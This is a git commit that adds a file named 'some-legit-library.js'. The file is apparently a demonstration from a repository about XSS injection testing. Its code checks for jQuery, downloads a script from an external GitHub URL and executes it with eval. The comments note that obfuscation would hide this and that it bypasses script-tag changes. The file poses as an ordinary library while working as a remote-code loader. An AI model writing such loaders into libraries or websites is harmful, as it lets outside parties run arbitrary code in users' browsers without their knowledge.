b69388eeaa9b7101bc478ab4542d1d0b19f8dac8
Dani Crespo <disier@gmail.com>
2022-03-25 19:42:01 +0100

    Create some-legit-library.js

---
+++ some-legit-library.js
@@ -0,0 +1,15 @@
+// Obfuscation would make impossible to state this is happening
+
+// Check if JQery is loaded
+if ("undefined" == typeof window.jQuery) {
+    alert("Sorry. Not tested without JQuery so far");
+  } else {
+    // Execute call to download external script
+    $.ajax({
+      url: "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?" + new Date().getTime(),
+      success: function (data) {
+        // Execute the script without SCRIPT tag modification
+        eval(data);
+      },
+    });
+  }
